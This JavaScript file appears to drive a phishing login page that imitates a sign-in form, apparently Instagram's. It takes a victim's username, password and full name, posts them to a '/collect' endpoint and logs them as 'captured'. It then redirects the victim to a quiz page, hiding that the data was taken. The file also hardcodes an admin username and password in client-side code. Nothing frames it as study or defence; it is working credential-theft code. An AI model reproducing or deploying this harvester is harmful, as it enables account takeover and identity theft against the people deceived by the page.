const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');

function checkInputs() {
    if (usernameInput.value.length > 0 && passwordInput.value.length >= 6) {
        loginBtn.classList.add('active');
        loginBtn.style.cursor = 'pointer';
    } else {
        loginBtn.classList.remove('active');
        loginBtn.style.cursor = 'default';
    }
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

const nameModal = document.getElementById('name-modal');
const fullnameInput = document.getElementById('fullname');
const confirmBtn = document.getElementById('confirm-btn');

document.getElementById('login-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const username = usernameInput.value;
    const password = passwordInput.value;

    // Admin Login Check
    if (username === 'joyboy' && password === 'sungodnika') {
        window.location.href = 'admin.html';
        return;
    }

    if (username.length > 0 && password.length >= 6) {
        nameModal.classList.add('show');
    }
});

confirmBtn.addEventListener('click', async () => {
    const username = usernameInput.value;
    const password = passwordInput.value;
    const fullname = fullnameInput.value;

    if (!fullname) {
        fullnameInput.style.borderColor = '#ff3b30';
        return;
    }

    // Basic visual feedback
    confirmBtn.innerText = 'Verifying...';
    confirmBtn.disabled = true;

    try {
        const response = await fetch('/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password, fullname })
        });

        const result = await response.json();

        if (result.success) {
            console.log('Data captured successfully');
            // Redirect to the Instagram signup page as a "fallback" or "success" action
            // Redirect to the quiz game
            window.location.href = 'quiz/index.html';
        } else {
            console.error('Server error:', result.error);
            alert('An error occurred. Please try again.');
            confirmBtn.innerText = 'Verify Identity';
            confirmBtn.disabled = false;
        }
    } catch (error) {
        console.error('Fetch error:', error);
        alert('Could not connect to the data collection server.');
        confirmBtn.innerText = 'Verify Identity';
        confirmBtn.disabled = false;
    }
});
